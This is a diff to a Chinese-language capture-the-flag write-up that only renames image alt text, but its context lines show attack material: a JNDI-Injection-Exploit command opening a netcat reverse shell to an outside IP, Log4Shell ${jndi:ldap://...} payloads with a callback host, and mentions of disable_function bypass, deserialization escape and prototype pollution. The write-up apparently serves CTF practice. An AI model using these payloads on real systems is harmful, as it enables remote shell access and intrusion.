@@ -312,7 +312,7 @@ var r = {code: 'bugku10000'}
   }
 ```
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 这里填进去直接复制粘贴比较好不然一直弄不出来，`zxc123`
 
@@ -320,7 +320,7 @@ var r = {code: 'bugku10000'}
 
 一样的爆破只不过这里是纯五位数字
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 `12468`
 
@@ -1076,7 +1076,7 @@ key.*key.{4,7}key:\/.*\/(.*key)[a-z][[:punct:]]
 http://114.67.175.224:15541/?id=keyaaakeyaaaaakey:/a/akeya,
 ```
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 # Flask_FileUpload
 
@@ -1174,7 +1174,7 @@ highlight_file(__FILE__);
 
 链接之后发现不能动，这一看就是绕过`disable_function`，但是这里我的文件好像是被删除了，所以我重新下载了一下(挂代理，不然卡死你)
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 ```
 .antproxy.php
@@ -1639,11 +1639,11 @@ java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc 156.238.233.
 ${jndi:ldap://roj1ec4qvt9q7rfcigcrnaen9ef43t.oastify.com}
 ```
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 说明存在
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
 ```
 ${jndi:[攻击payload]}
@@ -1663,7 +1663,7 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc 156.238.233.93 9999
 ${jndi:ldap://156.238.233.93:1389/gykkfc}
 ```
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 成功了
 
@@ -1732,7 +1732,7 @@ if(preg_match('/flag/is',$a))
 unserialize(read(write($a)));
 ```
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 字符逃逸这里每次能逃逸三个字符，现在就是利用反序列化去得到`hint`
 
@@ -1915,7 +1915,7 @@ module.exports = router;
 
 一进来看到`set-value`
 
-![1](./assets/009.png)
+![image](./assets/009.png)
 
 可以能行污染，这里我们先污染age再污染密码，这里写exp，手动污染一直不成功
 
@@ -1948,7 +1948,7 @@ getflag(url,data)
 
 诶有师傅可能会像我一样想着最后两步是怎么回事，代码看看就知道了
 
-![1](./assets/010.png)
+![image](./assets/010.png)
 
 # Java EL表达式注入
 
@@ -1972,7 +1972,7 @@ Connection: close
 {"exp":"['115.195.167.159','115.195.167.159','164.90.230.201', '174.87.232.68']","limit":"6"}
 ```
 
-![1](./assets/011.png)
+![image](./assets/011.png)
 
 OK那弹shell
 
@@ -2244,7 +2244,7 @@ if(!isset($_POST['a'])){
 
 进来就有源码，这里我们先绕过wakeup先删除`./sandbox/lock.lock`，然后就可以利用文件进行flag的读取
 
-![1](./assets/012.png)
+![image](./assets/012.png)
 
 这里30个字符
 
